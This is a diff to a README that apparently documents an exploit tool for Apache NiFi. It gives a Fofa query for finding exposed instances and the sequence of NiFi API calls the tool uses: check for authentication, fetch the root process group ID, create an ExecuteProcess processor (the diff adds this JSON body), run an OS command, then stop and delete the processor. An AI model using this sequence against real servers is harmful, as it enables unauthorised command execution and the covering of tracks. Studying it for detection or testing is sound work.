@@ -22,8 +22,7 @@ Fofa Query: `title=="NiFi"`
 # How does the Exploit work
 ## GET /nifi-api/access/config: Used to check whether the target is running NiFi and whether authentication is required.  
 Example Output:
-<pre>
-{
+<pre>{
     "config": {
 	    "supportsLogin": true
 	}
@@ -42,8 +41,7 @@ HTTP Parameters: **username, password**
 
 ## GET /nifi-api/process-groups/root: Used to obtain the ID of the root process group.  
 Example Output:
-<pre>
-{
+<pre>{
     "revision": {REDACTED},
     "id": "value",
     "uri": "value",
@@ -73,10 +71,19 @@ Example Output:
     "parameterContext": {REDACTED},
     "inputPortCount": 0,
     "outputPortCount": 0
-}
-</pre>
+}</pre>
 ## POST /nifi-api/process-groups/\<ROOT-PROCESSOR-GROUP-ID\>/processors: Used to create an ExecuteProcess processor in the root group.  
-Content Type: **application/json**  
+Content Type: **application/json**
+Post Data:
+<pre>{
+    "component": {
+        "type": "org.apache.nifi.processors.standard.ExecuteProcess"
+    },
+    "revision": {
+        "version": 0
+    }
+}</pre>
+
 ## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>: Used to configure the new ExecuteProcess processor and run the OS command.
 ## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>/run-status: Used to stop the new ExecuteProcess processor prior to deletion.  
 ## DELETE /nifi-api/processors/\<NEW-PROCESSOR-ID\>/threads: Used to terminate threads in case stopping failed.
